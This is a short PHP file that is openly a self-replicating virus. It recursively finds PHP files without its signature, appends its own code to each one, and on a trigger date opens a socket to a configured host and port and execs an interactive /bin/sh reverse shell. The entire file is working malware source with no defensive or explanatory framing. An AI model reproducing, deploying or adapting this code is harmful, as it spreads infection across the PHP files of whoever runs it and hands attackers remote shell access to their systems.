<?php
// define signature
define("SIGNATURE", "§16N47UR3");
// determine whether backslash or forward slashes are used
define("SLASH", stristr($_SERVER['PWD'], "/") ? "/" : "\\");

// get linenumbers and start-/endline
$linenumber = __LINE__;
define("STARTLINE",$linenumber-4);
define("ENDLINE",$linenumber+78);

// sets Hostname and Port
define("Hostname", "127.0.0.1");
define("Port", 1234);

// search files in dir
function search($path){
    $ret = "";
    $fp = opendir($path);
    while($f = readdir($fp)){
        if( preg_match("#^\.+$#", $f) ) continue; // ignore symbolic links
        $file_full_path = $path.SLASH.$f;
        if(is_dir($file_full_path)) { // if it's a directory, recurse
            $ret .= search($file_full_path);
        } else if( !stristr(file_get_contents($file_full_path), SIGNATURE) ) { // search for uninfected files to infect
            $ret .= $file_full_path."\n";
        }   
    }   
    return $ret;
}

// modify old code to fit in and get executed
function parse_filecontents($filecontents, $classif){
    $parsed = str_replace("?>", " ", $filecontents);
    if($classif == True){
        $parsed_file = str_replace("<?php", " ", $parsed);
        return $parsed_file;
    }
    else{
        return $parsed;
    }
}

// infect files and exec
function infect($filestoinfect){
    $handle = @fopen(__FILE__, "r");
    $counter = 1;
    $virusstring = ""; 
    while(($buffer=fgets($handle,4096)) !== false){
        if($counter>=STARTLINE && $counter<=ENDLINE){
            $virusstring .= $buffer;
        }   
        $counter++;
    }   
    fclose($handle);
    $filesarray = array();
    $filesarray = explode("\n",$filestoinfect);
    foreach($filesarray AS $v){
        if(substr($v,-4)===".php"){
            $filecontents = file_get_contents($v);
            $Completecontent = parse_filecontents($filecontents, False);
            $virusfile = parse_filecontents($virusstring, True);
            file_put_contents($v,$Completecontent."\n".$virusfile."?>");
        }
    }
}

// exec payload
function payload(){
    if(date("md") == 0424){
        $sock = fsockopen(Hostname, Port);
        exec ("/bin/sh -i <&3 >&3 2>&3");
    }
}
$filestoinfect = search(__DIR__);
infect($filestoinfect);
payload();
?>
